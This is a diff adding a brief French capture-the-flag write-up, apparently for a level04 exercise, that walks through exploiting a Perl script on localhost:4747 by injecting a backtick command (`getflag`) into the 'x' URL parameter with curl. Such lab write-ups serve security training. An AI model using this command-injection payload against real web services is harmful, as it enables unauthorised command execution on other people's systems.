@@ -1,0 +1,17 @@
+cat level04.pl on voit localhost:4747
+En testant en curl http://localhost:4747 on voit un saut de ligne, bizarre nn ?
+Du coup on teste avec un paramètre car on a vu auparavant dans le fichier perl que quand il y a un paramètre “x” il est sensé faire un echo du paramètre en question
+
+On s’aperçoit , que si on fait curl http://localhost:4747?x=42, alors 42 s’affiche dans la console
+
+Donc maintenant ce qu’on veut c’est afficher le flag 04
+Donc logiquement on test http://localhost:4747?x=getflag
+Mais ca ne marche pas, en effet dans la console ce qu’on vient d’essayer reviendrait a ecrire: echo “getflag”
+
+Donc après 2secondes a réfléchir on se rend compte qu’on veut que la console fasse 
+Echo "`getflag`" (pour que la commande getflag soit evaluée en tant que tel)
+
+
+Donc pour finir on fait 
+
+curl "http://localhost:4747?x=\`getflag\`" (les backslash pour que ca fonctionne)
